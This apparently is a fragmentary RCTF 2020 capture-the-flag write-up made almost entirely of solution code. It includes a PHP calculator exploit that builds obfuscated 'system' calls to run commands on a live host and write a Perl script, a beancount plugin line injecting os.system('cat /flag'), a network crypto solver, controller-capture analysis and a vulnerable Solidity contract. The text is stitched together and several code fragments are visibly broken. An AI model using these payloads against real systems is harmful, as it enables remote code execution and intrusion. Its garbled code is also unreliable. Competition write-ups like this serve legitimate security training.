    "D" => "(((1/0).(1)){2})&(((4).(1){1})|(((1/0).(1)){0}))",
    "G" => "(((1).(1){1})|(((1/0).(1)){2}))&((((1/0).(1)){0})|(((1/0).(1))
{1}))",
    "K" => "(((2).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1))
{1}))",
    "M" => "(((4).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1))
{1}))",
    "C" => "(((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&
((((1/0).(1)){0})|(((1/0).(1)){1})))",
    "E" => "(((1).(1){1})|(((1/0).(1)){2}))&((((4).(1){1})|(((1/0).(1)){0}))&
((((1/0).(1)){0})|(((1/0).(1)){1})))"
];
$res = [];
foreach ($table as $x) {
    foreach ($table as $y) {
        eval("\$a = (" . $x . ")|(" . $y .");");
        if (!isset($res[$a]) && !isset($table[$a])) {
            $res[$a] = "(" . $x . ")|(" . $y . ")";
        }
        eval("\$a = (" . $x . ")&(" . $y .");");
        if (!isset($res[$a]) && !isset($table[$a])) {
            $res[$a] = "(" . $x . ")&(" . $y . ")";
        }
    }
}
var_dump($res);
Solve the easy challenge first (((((-349836)-(802460))-(460622))+(-916081))-(304266)) input your
answer: calculate error! input your answer: calculate error!
((((3).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))).(((0).(1){1})|(((1/0).(1))
{0})).(((3).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))).(((4).(1){1})|
((((1/0).(1)){0})&(((1/0).(1)){2}))).((((1).(1){1})|(((1/0).(1)){2}))&((((4).
(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).((((4).(1){1})|
(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1}))))((((((1).(1){1})|
(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).
(1)){1})))).((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1))
{0})&(((1/0).(1)){2}))))(47).(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|
(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&
(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))))(114).
(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).
(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|
((((1/0).(1)){0})&(((1/0).(1)){2}))))(101).(((((1).(1){1})|(((1/0).(1)){2}))&
((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).
((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1)){0})&(((1/0).
(1)){2}))))(97).(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1))
{0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&(((1/0).(1))
{1})).(((2).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))))(100).(((((1).(1){1})|
(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).
(1)){1})))).((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1))
{0})&(((1/0).(1)){2}))))(102).(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|
(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&
(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))))(108).
(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).
(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|
((((1/0).(1)){0})&(((1/0).(1)){2}))))(97).(((((1).(1){1})|(((1/0).(1)){2}))&
((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).
((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|((((1/0).(1)){0})&(((1/0).
(1)){2}))))(103))
import requests
import string
url = "http://124.156.140.90:8081/calc.php?num="
func = {"system":"((((3).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))).(((0).(1)
{1})|(((1/0).(1)){0})).(((3).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))).
(((4).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))).((((1).(1){1})|(((1/0).(1))
{2}))&((((4).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1})))).
((((4).(1){1})|(((1/0).(1)){0}))&((((1/0).(1)){0})|(((1/0).(1)){1}))))","chr":"
(((((1).(1){1})|(((1/0).(1)){2}))&((((2).(1){1})|(((1/0).(1)){0}))&((((1/0).
(1)){0})|(((1/0).(1)){1})))).((((1/0).(1)){0})&(((1/0).(1)){1})).(((2).(1){1})|
((((1/0).(1)){0})&(((1/0).(1)){2}))))"}
MISC
Welcome to the RCTF 2020
tg
mysql_interface
write = "echo -n '{}' >> /tmp/qqq"
pl = """#!/usr/bin/env perl
use warnings;
use strict;
use IPC::Open2;
$| = 1;
my $pid = open2(\*out2, \*in2, "/readflag") or die;
my $reply = ;
print STDOUT $reply;
$reply = ;
print STDOUT $reply;
my $answer = eval($reply);
print STDOUT "answer: $answer\\n";
print in2 " $answer ";
in2->flush();
$reply = ;
print STDOUT $reply;
$reply = ;
print STDOUT $reply;"""
for i in pl:
    payload = write.format(i)
    payload = list(payload)
    exp = []
    for j in payload:
        exp.append(func['chr'] + "(" + str(ord(j)) + ")")
    exp = '.'.join(exp)
    exp = func['system'] + "(" + exp + ")"
    print(exp)
    res = requests.get(url + exp.replace('&', '%26'))
    print(res.content)
# perl /tmp/qqq
select flag from .flag
issue
Switch PRO Controller
Switch ProUSBflaghttps://github.com/ToadKing/switch
-pro-x/blob/master/switch-pro-x/ProControllerDevice.cpp
A
flag
bean
FeedBack
import cv2
DELTA = 6
with open('data.csv', 'r') as f:
    content = f.readlines()[1:]
pressed = False
press_time = []
for line in content:
    _, time, _, _, _, _, data, _ = line.split(',')
    time = float(time[1:-1])
    data = data[1:-1]
    if data.startswith('30'):
        if not pressed and int(data[6:8], 16) & 0x08:
            pressed = True
            print(time, 'pressed')
            press_time.append(int((time+DELTA)*1000))
        elif pressed and not int(data[6:8], 16) & 0x08:
            pressed = False
            print(time, 'released')
cap = cv2.VideoCapture('screenrecord.mp4')
for idx, frame_time in enumerate(press_time):
    cap.set(cv2.CAP_PROP_POS_MSEC, frame_time)
    ret, frame = cap.read()
    cv2.imwrite("image_{}.jpg".format(idx), frame)
plugin "beancount.plugins.check_average_cost" "__import__('os').system('cat 
/flag')"
Crypto
easy_f(x)
#!/usr/bin/env sage
import hashlib, socket, telnetlib, IPython, string, itertools
#HOST, PORT = 'localhost', 2333
HOST, PORT = '124.156.140.90', 2333
s = socket.socket()
s.connect((HOST, PORT))
f = s.makefile('rw', 0)
def recv_until(f, delim='\n'):
  buf = ''
  while not buf.endswith(delim):
    buf += f.read(1)
  return buf 
def proof_of_work(suffix, chal):
  for comb in itertools.product(string.digits + string.ascii_letters, 
repeat=4):
    m = ''.join(comb)
    if hashlib.sha256(m + suffix).hexdigest() == chal:
      return m
  raise Exception("Not found...")
print 'PoWing...'
recv_until(f, 'XXXX+')
suffix = recv_until(f, ')')[:-1]
recv_until(f, ' == ')
chal = recv_until(f, '\n').strip()
work = proof_of_work(suffix, chal)
recv_until(f, 'XXXX:')
f.write(work + '\n')
print 'Sending number...'
recv_until(f, 'M=')
m = ZZ(recv_until(f, '\n').strip())
Zn = Zmod(m)
P. = PolynomialRing(Zn)
recv_until(f, 'want?')
f.write('769\n')
BlockChain
roiscoin
print 'Reading points...'
points = []
for i in xrange(769):
  recv_until(f, 'f(')
  x = recv_until(f, ')')[:-1]
  recv_until(f, '=')
  y = recv_until(f, '\n')[:-1]
  points.append((ZZ(x), ZZ(y)))
print 'Interpolation...'
poly = P.lagrange_polynomial(points)
f.write(str(poly[0]) + '\n')
print 'Interactive...'
t = telnetlib.Telnet()
t.sock = s
t.interact()
pragma solidity ^0.4.23;
contract FakeOwnerGame {
    event SendFlag(address _addr);
    uint randomNumber = 0;
    uint time = now;
    mapping (address => uint) public BalanceOf;
    mapping (address => uint) public WinCount;
    mapping (address => uint) public FailCount;
    bytes32[] public codex;
    address private owner;
    uint256 settlementBlockNumber;
    address guesser;
    uint8 guess;
    struct FailedLog {
        uint failtag;
        uint failtime;
        uint success_count;
        address origin;
        uint fail_count;
        bytes12 hash;
        address msgsender;
    }
    mapping(address => FailedLog[]) FailedLogs;
    constructor() {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function payforflag() onlyOwner {
        require(BalanceOf[msg.sender] >= 2000);
        emit SendFlag(msg.sender);
        selfdestruct(msg.sender);
    }
    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);
        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }
    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) 
% 2;
        if (guess == answer) {
            WinCount[msg.sender] += 1;
            BalanceOf[msg.sender] += 1000;
        } else {
            FailCount[msg.sender] += 1;
        }
        if (WinCount[msg.sender] == 2) {
            if (WinCount[msg.sender] + FailCount[msg.sender]  0);
        if(msg.value >= address(this).balance){
            owner = msg.sender;
        }
    }
    function revise(uint idx, bytes32 tmp) {
        codex[idx] = tmp;
    }
}